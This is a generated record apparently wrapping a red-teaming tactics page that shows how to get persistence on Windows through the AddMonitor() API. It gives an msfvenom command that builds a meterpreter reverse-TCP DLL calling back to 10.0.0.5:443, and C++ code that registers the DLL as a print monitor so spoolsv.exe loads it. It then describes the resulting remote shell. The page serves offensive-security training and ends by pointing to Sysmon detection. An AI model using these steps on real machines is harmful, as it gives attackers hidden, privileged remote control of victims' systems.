---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# AddMonitor\(\)

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-persistence-t1013-addmonitor` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1013-addmonitor.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Generating a 64-bit meterpreter payload to be injected into the spoolsv.exe:

## Preserved Body

````markdown
## Execution

Generating a 64-bit meterpreter payload to be injected into the spoolsv.exe:
```csharp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > evil64.dll
```
Writing and compiling a simple C++ code that will register the monitor port:
```cpp
#include "stdafx.h"
#include "Windows.h"

int main() {	
	MONITOR_INFO_2 monitorInfo;
	TCHAR env[12] = TEXT("Windows x64");
	TCHAR name[12] = TEXT("evilMonitor");
	TCHAR dll[12] = TEXT("evil64.dll");
	monitorInfo.pName = name;
	monitorInfo.pEnvironment = env;
	monitorInfo.pDLLName = dll;
	AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);
	return 0;
}
```
Move evil64.dll to `%systemroot%` and execute the compiled `monitor.cpp`.

## Observations

Upon launching the compiled executable and inspecting the victim machine with procmon, we can see that the evil64.dll is being accessed by the spoolsvc:

![](<../../_assets/monitor-loaddll.png>)

![](<../../_assets/monitor-loaddll2.png>)

which eventually spawns a rundll32 with meterpreter payload, that initiates a connection back to the attacker:

![](<../../_assets/rundll-connect.png>)

![](<../../_assets/monitor-shell-system.png>)

The below confirms the procmon results explained above:

![](<../../_assets/monitor-spoolsvc-rundll.png>)

Sysmon commandline arguments and network connection logging to the rescue:

![](<../../_assets/monitor-sysmon.png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/addmonitor.md)

## Evidence Excerpt

```text
_asset_filenames:
- monitor-loaddll.png
- monitor-loaddll2.png
- monitor-shell-system.png
- monitor-spoolsvc-rundll.png
- monitor-sysmon.png
- rundll-connect.png
_body: "---\ndescription: 'Persistence, Privilege Escalation'\n---\n\n# AddMonitor\\(\\)\n\n## Execution\n\nGenerating a 64-bit\
```
